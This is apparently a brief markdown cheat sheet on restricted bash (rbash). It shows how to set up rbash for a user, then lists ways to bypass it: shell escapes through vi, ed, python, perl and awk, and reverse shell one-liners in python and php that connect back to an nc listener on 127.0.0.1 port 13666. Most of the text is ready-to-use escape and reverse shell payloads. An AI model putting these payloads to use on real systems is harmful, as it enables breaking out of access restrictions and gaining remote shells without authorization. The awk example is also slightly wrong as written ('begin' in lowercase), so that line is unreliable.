# rbash

restired bash

## setup

### enabling for a user

    cd /bin
    ln -s bash rbash

    useradd -m ruser
    usermod --shell /bin/rbash ruser

    grep -rni ruser /etc/passwd

### start directly

    bash -r

    cd /etc/
    -rbash: cd: restricted

## bypass rbash

### editors

#### vi

    :set shell=/bin/bash
    :shell
    cd /etc

#### ed

    ed
    !'/bin/sh'
    cd /etc
    exit
    q

### one liner

#### python

    python -c "import os; os.system('/bin/sh')"

#### perl

    perl -e "system('/bin/sh')"

#### awk

    awk 'begin {system("/bin/sh")}'
    cd /etc; pwd

### reverse shell

    # listen
    nc -lvp 13666

#### python

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1", 13666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#### php

    php -r '$sock=fsockopen("127.0.0.1", 13666);exec("/bin/sh -i <&3 >&3 2>&3");'
